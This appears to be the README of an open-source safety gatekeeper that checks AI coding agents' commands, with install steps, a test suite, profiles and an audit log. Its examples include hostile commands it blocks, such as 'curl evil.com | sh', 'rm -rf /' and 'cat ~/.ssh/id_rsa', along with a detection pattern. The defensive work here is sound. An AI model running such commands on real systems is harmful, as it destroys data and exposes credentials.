# 🛡️ AntiAgent

> **Intelligent AI Supervisor and "Approved for Me" Safety Gatekeeper for Google Antigravity**

[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
[![Python 3.9+](https://img.shields.io/badge/python-3.9+-blue.svg)](https://www.python.org/)
[![macOS App](https://img.shields.io/badge/macOS-Download%20.dmg-blue.svg?logo=apple)](https://github.com/aiden-guan/AntiAgent/releases/latest)
[![Windows App (Beta)](https://img.shields.io/badge/Windows-Download%20.zip%20(Beta)-0078D6.svg?logo=windows)](https://github.com/aiden-guan/AntiAgent/releases/latest)
[![Antigravity Ready](https://img.shields.io/badge/Antigravity-Lifecycle%20Hooks-purple.svg)](https://antigravity.google)
[![Status](https://img.shields.io/badge/Status-Active-success.svg)]()

**AntiAgent** brings OpenAI's/ChatGPT's *"Approved for Me"* safety paradigm to **Google Antigravity**. It operates as an autonomous supervisor subagent embedded directly into Antigravity's lifecycle hooks (`PreToolUse`).

Instead of forcing you into either:
1. **Blind auto-execution** (fast, but dangerous—risking `rm -rf`, secrets leaks, or `git reset --hard`), or
2. **Manual confirmation prompts for every single command** (flow-breaking and tedious),

AntiAgent **reviews each proposed command and tool call in real time**:
- 🟢 **Auto-approves** harmless routine development actions (`ls`, `dir`, `view_file`, `git status`, `npm test`, `pytest`, internal edits).
- 🟡 **Pauses and requests user approval (`ask`)** for destructive commands, workspace escapes, or ambiguous operations.
- 🔴 **Hard-blocks (`deny`)** catastrophic or malicious operations (system directory wipes, piping untrusted URLs to shell, reading SSH private keys or Windows registry hives).

---

## 🏛️ Architecture

```
                       ┌─────────────────────────────────────────┐
                       │       Google Antigravity Agent          │
                       │     (Proposes Tool Call / Command)      │
                       └────────────────────┬────────────────────┘
                                            │ PreToolUse Hook (stdin)
                                            ▼
                       ┌─────────────────────────────────────────┐
                       │          AntiAgent Gatekeeper           │
                       │                                         │
                       │   Tier 1: Deterministic Engine (<2ms)   │
                       │   • Safe tool list & read-only parser   │
                       │   • Workspace boundary & secret shield  │
                       │   • Hard-deny catastrophe patterns      │
                       └───────────┬─────────────────┬───────────┘
                                   │                 │
                Ambiguous / Mutating Actions         │ Obvious Safe / Denied
                                   │                 │
                                   ▼                 ▼
          ┌──────────────────────────────────┐  ┌────────────────────────┐
          │ Tier 2: AI Supervisor Subagent   │  │ Instant Local Verdict  │
          │ (Gemini Flash / OpenAI / Ollama) │  │ (Allow or Hard-Deny)   │
          └────────────────┬─────────────────┘  └───────────┬────────────┘
                           │                                │
                           └────────────────┬───────────────┘
                                            │ Emits Hook Output (stdout)
                                            ▼
               ┌────────────────────────────────────────────────────────┐
               │ "allow"     -> Auto-execute without prompt             │
               │ "ask"       -> Present to user with risk rationale     │
               │ "force_ask" -> Always require explicit confirmation    │
               │ "deny"      -> Block immediately                       │
               └────────────────────────────────────────────────────────┘
```

---

## 🚀 Quickstart & Downloads

> [!TIP]
> ### ❓ Which download should I choose?
> - **macOS**: Download **[`AntiAgent.dmg`](https://github.com/aiden-guan/AntiAgent/releases/latest/download/AntiAgent.dmg)** (recommended for 99% of Mac users). Drag to Applications and you're done.
> - **Windows (Public Beta)**: Download **[`AntiAgent-Windows.zip`](https://github.com/aiden-guan/AntiAgent/releases/latest/download/AntiAgent-Windows.zip)**. Extract and double-click `AntiAgent.bat`.
> - **What is the difference between DMG, PKG, and ZIP?**
>   - **`.dmg` (macOS)**: Standard macOS disk image with custom drag-and-drop installer. **Choose this for Mac.**
>   - **`.pkg` (macOS)**: Guided installer package with automated wizard. Best for enterprise / MDM deployment.
>   - **`.zip` (macOS)**: Portable `.app` archive without disk image mounting.
>   - **`AntiAgent-Windows.zip` (Windows - Beta)**: Complete standalone package for Windows 10 & 11 with native desktop window launcher.

---

### 🍎 Option A: macOS Installation

#### 1. Download Standalone Desktop App (Recommended)
1. Download **[`AntiAgent.dmg`](https://github.com/aiden-guan/AntiAgent/releases/latest/download/AntiAgent.dmg)** from the latest release.
2. Open the disk image and drag **`AntiAgent.app`** into your `/Applications` folder.
3. Launch **AntiAgent** from Spotlight or Applications.
4. Click **"🚀 Guide & Doctor"** in the top bar and click **"Enable Global Hook"**.
   - *Done! Antigravity is now protected across all your projects without touching a terminal.*

> 💡 **Tip for macOS Gatekeeper**: Because AntiAgent is free and open-source, macOS may show an unidentified developer warning on first launch. Simply **Right-Click (Control-click)** `AntiAgent.app` and choose **Open**, or run:
> ```bash
> xattr -cr /Applications/AntiAgent.app
> ```

#### 2. Or 1-Line Terminal Install (Auto-clears Gatekeeper)
```bash
curl -fsSL https://raw.githubusercontent.com/aiden-guan/AntiAgent/main/install.sh | bash
```

---

### 🪟 Option B: Windows Installation (Windows 10 & 11 — Public Beta)

> [!NOTE]
> **Windows Support is currently in Public Beta**: The safety engine, heuristics, and Antigravity lifecycle hooks are fully functioning on Windows. The standalone Windows desktop application mode is newly released in Beta. If you encounter any platform-specific quirks or edge cases, please report them via [GitHub Issues](https://github.com/aiden-guan/AntiAgent/issues) so we can continuously refine the Windows experience!

#### 1. Download Standalone Desktop Package (Beta — Recommended)
1. Download **[`AntiAgent-Windows.zip`](https://github.com/aiden-guan/AntiAgent/releases/latest/download/AntiAgent-Windows.zip)** from the latest release.
2. Extract the ZIP archive anywhere on your PC.
3. Double-click **`AntiAgent.bat`** to launch the native desktop application.
4. Click **"🚀 Guide & Doctor"** in the top bar and click **"Enable Global Hook"** (or double-click `Install-Hook.bat`).
   - *Google Antigravity is now fully protected on Windows!*

> 💡 **Tip for Windows SmartScreen**: If Windows Defender SmartScreen displays a warning, click **More info** → **Run anyway**.

#### 2. Or 1-Line PowerShell Install
Open PowerShell and run:
```powershell
irm https://raw.githubusercontent.com/aiden-guan/AntiAgent/main/install.ps1 | iex
```
*(This automatically verifies Python 3.9+, registers the global Antigravity hook, creates a Desktop shortcut, and starts the desktop app).*

---

### 💻 Option C: Command Line / Pip Install (All Platforms)

If you prefer using the terminal or managing dependencies with `pip`:

```bash
# 1. Clone and install:
git clone https://github.com/aiden-guan/AntiAgent.git
cd AntiAgent
pip install -e .

# 2. Register protection hook with Antigravity:
# Protect all Antigravity projects globally:
antiagent install --global

# Or protect current workspace only:
antiagent install

# 3. Launch native desktop app or web dashboard:
antiagent app
# or
antiagent dashboard
```

---

## 🧪 Verify Installation

Run the simulation suite to see AntiAgent evaluate sample commands across Unix and Windows:

```bash
antiagent test
```

Sample output:
```text
🧪 Running AntiAgent Safety Simulation Suite (v0.1.3)
============================================================
✅ PASS [ALLOW] Benign directory read (ls -la)
✅ PASS [ALLOW] Benign git status inspection
✅ PASS [ALLOW] Routine test runner (pytest)
✅ PASS [DENY]  Hard-denied root wipe (rm -rf /)
✅ PASS [DENY]  Hard-denied piping web script to shell (curl | bash)
✅ PASS [DENY]  Hard-denied credential exfiltration (cat ~/.ssh/id_rsa)
✅ PASS [ASK]   Risky git force push (git push --force)
✅ PASS [ASK]   Destructive branch wipe (git clean -fdx)
✅ PASS [ASK]   Modifying file outside workspace (/etc/hosts)
✅ PASS [ASK]   Modifying sensitive credentials (.env)
============================================================
Results: 10/10 tests passed.
```

To run a full health check of your Antigravity environment:
```bash
antiagent doctor
```

---

---

## 🐙 Auto-PR & CI Monitoring (Claude Code Style)

AntiAgent features integrated pull request and CI/CD monitoring modeled after Claude Code's background tracking and auto-fix capabilities.

- **Real-Time CI Watcher**: Monitors open PRs and tracks GitHub Actions check runs (tests, linting, build) with live progress.
- **Automated Failure Diagnostics (`autofix`)**: When CI checks fail, AntiAgent extracts the exact failure logs from the failed workflow steps so you or Antigravity can immediately diagnose and resolve errors.
- **Auto-Merge on Green**: Optionally auto-merges (or arms GitHub auto-merge) as soon as all required checks turn green.
- **Zero-Friction GitHub Inspection**: Standard inspection commands (`gh pr status`, `gh pr checks`, `gh pr view`, `gh pr list`) are pre-approved without prompts.

```bash
# Inspect current branch's PR status and check runs
antiagent pr status

# Live watch CI checks until completion (with optional auto-merge)
antiagent pr monitor --auto-merge

# Inspect failed checks and extract error logs for instant debugging
antiagent pr autofix

# List open pull requests
antiagent pr list

# Enable auto-PR monitoring by default in your configuration
antiagent config --set-auto-pr-monitor true
antiagent config --set-pr-auto-merge true
```

---

## 🖥️ Remote Sessions via SSH

AntiAgent provides production-grade **Remote Sessions via SSH**, enabling you to manage and attach to Google Antigravity sessions running on remote machines (Mac Minis, Linux servers, cloud VMs, or dedicated build boxes) from your local workstation or laptop.

```
┌──────────────────────────────────────┐             Standard OpenSSH / PTY
│       Local AntiAgent Host           │ ──────────────────────────────────────────────┐
│  • CLI: antiagent remote connect     │                                               │
│  • Dashboard: /api/remotes/*         │                                               │
│  • Registry: ~/.antiagent/remotes.json│                                               │
└──────────────────────────────────────┘                                               │
                                                                                       ▼
                                                             ┌─────────────────────────────────────────┐
                                                             │           Remote Machine                │
                                                             │   • Native OpenSSH Server (sshd)        │
                                                             │   • agy --remote-control (Daemon)       │
                                                             │   • AntiAgent PreToolUse Hook (Protected│
                                                             └─────────────────────────────────────────┘
```

### 🔒 Core Security Principles

- **Zero Secret Storage**: AntiAgent **never** prompts for or saves SSH passwords, passphrase strings, private key contents, or OAuth tokens. It delegates authentication exclusively to your local OpenSSH client, `ssh-agent`, and `~/.ssh/config`.
- **Strict Host Key Verification**: AntiAgent **never** passes `StrictHostKeyChecking=no` or `UserKnownHostsFile=/dev/null`. Your standard `~/.ssh/known_hosts` file is strictly respected to prevent Man-in-the-Middle (MITM) attacks.
- **Zero Shell Injection**: Subprocesses are executed using argument arrays (`list[str]`) without `shell=True`. Hostnames, aliases, ports, and instance names are strictly validated against RFC/POSIX character sets.
- **Atomic Config Storage**: Host configurations are saved to `~/.antiagent/remotes.json` using atomic temporary file replacement and POSIX file mode `0600` (read/write only by the current user).

### 🚀 Remote CLI Quickstart

```bash
# 1. Register a remote machine (uses your ~/.ssh/config alias or IP)
antiagent remote add devbox 192.168.1.50 --user ubuntu --workspace ~/projects/app --agy-name "Ubuntu Devbox"

# 2. Test SSH connectivity and latency
antiagent remote test devbox

# 3. Run full remote health diagnostics (checks SSH, Antigravity binary, daemon, and hook status)
antiagent remote doctor devbox

# 4. Install AntiAgent safety hook on the remote workspace
antiagent remote protect devbox

# 5. Start Antigravity daemon in the background on the remote machine
antiagent remote start devbox

# 6. Check remote daemon status and retrieve web control URL
antiagent remote status devbox

# 7. Attach an interactive terminal session (full PTY support with window resizing)
antiagent remote connect devbox

# 8. List all configured remote machines
antiagent remote list
```

### 🌐 Dashboard Integration

The AntiAgent Web Dashboard (`antiagent dashboard`) includes a real-time **Remote Sessions** card:
- **Live Fleet View**: Shows machine reachability, remote OS, background daemon status, and AntiAgent protection status at a glance.
- **1-Click Control**: Start or stop remote `agy --remote-control` daemons without logging in manually.
- **Visual Diagnostics Modal**: Run deep system health checks across SSH, workspaces, and binaries with actionable remediation tips.
- **Connection Tester**: Test OpenSSH connectivity and measure round-trip latency in milliseconds directly within the modal.
- **Localhost Security**: All remote REST endpoints are strictly bound to localhost with CSRF origin checks.

---

## ⚙️ Configuration & Safety Profiles

AntiAgent supports three distinct safety profiles:

| Profile | Routine Reads (`cat`, `dir`, `ls`, `view_file`) | Dev Commands (`npm test`, `pytest`) | File Edits in Project | Destructive Ops (`rm`, `del /s /q`, `git reset --hard`) | Credential/Secret Targets |
| :--- | :---: | :---: | :---: | :---: | :---: |
| **`balanced`** *(default)* | 🟢 Auto-Approve | 🟢 Auto-Approve | 🟢 Auto-Approve | 🟡 Ask User | 🟡 Ask User |
| **`paranoid`** | 🟢 Auto-Approve | 🟡 Ask User | 🟡 Ask User | 🟡 Ask User | 🔴 Deny |
| **`autonomous`** (OpenAI/Claude subagent review style)| 🟢 Auto-Approve | 🟢 Auto-Approve | 🟢 Auto-Approve | 🟢 Auto-Approve (if within bounds) | 🔴 Deny |

### Setting Your Profile & LLM Supervisor

Configure AntiAgent via CLI or environment variables:

```bash
# Change active safety stance
antiagent config --set-profile balanced

# Set AI supervisor provider (native, gemini, openai, ollama, or offline)
antiagent config --set-provider gemini --set-model gemini-2.5-flash

# Toggle Auto-PR monitoring & auto-merge
antiagent config --set-auto-pr-monitor true --set-pr-auto-merge false

# Include file explorations & tool calls in audit log alongside commands
antiagent config --set-audit-include-tool-calls true
```

Supported Environment Variables:
- `ANTIAGENT_PROFILE`: `balanced` | `paranoid` | `autonomous`
- `ANTIAGENT_PROVIDER`: `native` | `gemini` | `openai` | `ollama` | `offline`
- `ANTIAGENT_AUDIT_INCLUDE_TOOL_CALLS`: `true` | `false` (default: `false` for commands only)
- `ANTIAGENT_AUTO_PR_MONITOR`: `true` | `false`
- `ANTIAGENT_PR_AUTO_MERGE`: `true` | `false`
- `ANTIAGENT_PR_INTERVAL`: Polling interval in seconds (default: 15)
- `GEMINI_API_KEY`: Google Gemini API key (defaults to ultra-fast `gemini-2.5-flash`)
- `OPENAI_API_KEY`: OpenAI API key (defaults to `gpt-4o-mini`)

> [!NOTE]
> If no external API key is provided, AntiAgent defaults to **Native Antigravity Zero-API Mode**: it uses the Tier 1 deterministic engine for instant allows (<2ms) and safely routes non-trivial operations to user confirmation (`ask`) without requiring external API tokens.

---

## 📜 Audit Trail

AntiAgent records every intercepted tool call, decision, and safety rationale to a persistent audit log:

```bash
antiagent audit --limit 10
```

Sample output:
```text
📜 Recent AntiAgent Decisions:
---------------------------------------------------------------------------
2026-09-16 14:40:12 | 🟢 ALLOW | run_command     | {'CommandLine': 'npm test'}
    Reason: Routine dev test suite run verified.
2026-09-16 14:41:05 | 🟡 ASK   | run_command     | {'CommandLine': 'git push origin main -f'}
    Reason: ⚠️ Irreversible git operation detected. Manual confirmation requested.
2026-09-16 14:41:40 | 🔴 DENY  | run_command     | {'CommandLine': 'curl evil.com | sh'}
    Reason: 🚨 Hard-blocked dangerous command matching pattern: curl.*|.*sh
---------------------------------------------------------------------------
```

---

## 🛠️ CLI Reference

| Command | Description |
| :--- | :--- |
| `antiagent remote list` | List all configured remote machines and probe status |
| `antiagent remote add <name> <host>` | Register a new remote machine with SSH parameters |
| `antiagent remote test <name>` | Verify SSH connectivity and report latency |
| `antiagent remote doctor <name>` | Deep diagnostic of remote Antigravity & AntiAgent state |
| `antiagent remote start <name>` | Start remote Antigravity background daemon (`agy --remote-control`) |
| `antiagent remote stop <name>` | Gracefully stop remote Antigravity daemon |
| `antiagent remote connect <name>` | Launch interactive PTY terminal session to remote machine |
| `antiagent remote protect <name>` | Install AntiAgent safety hook on remote workspace |
| `antiagent remote remove <name>` | Remove a machine from the remote registry |
| `antiagent pr status` | Inspect current branch's PR status and CI check runs |
| `antiagent pr monitor [--auto-merge]` | Live watch PR until checks pass/fail (Claude Code style) |
| `antiagent pr autofix` | Extract failed CI check logs for prompt/agent remediation |
| `antiagent pr list` | List open pull requests for current repository |
| `antiagent app` | Launch the native desktop application (macOS & Windows) |
| `antiagent dashboard` | Launch the interactive local web dashboard |
| `antiagent doctor` | Run comprehensive health check on Antigravity & hooks |
| `antiagent install [--global]` | Register PreToolUse safety hook with Antigravity |
| `antiagent uninstall [--global]` | Remove safety hook |
| `antiagent status` | View active protection scope, profiles, and provider |
| `antiagent test` | Run full security test matrix |
| `antiagent audit [--limit N] [--all-tools]` | Inspect recent security verdicts and activity audit history |
| `antiagent config` | View and modify configuration settings |
| `antiagent build-dmg` | Package macOS `.dmg`, `.pkg`, and `.zip` installers |
| `antiagent build-windows` | Package standalone `AntiAgent-Windows.zip` (Windows Beta) |

---

## 📦 Antigravity Plugin Format

In addition to direct hook installation, AntiAgent comes bundled as an Antigravity plugin in the `plugin/` directory. You can drop it directly into `.agents/plugins/antiagent/` or `~/.gemini/config/plugins/antiagent/`.

---

## 🤝 Contributing

Contributions are welcome! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for details on submitting pull requests and reporting security concerns.

## 📄 License

AntiAgent is licensed under the [MIT License](LICENSE).
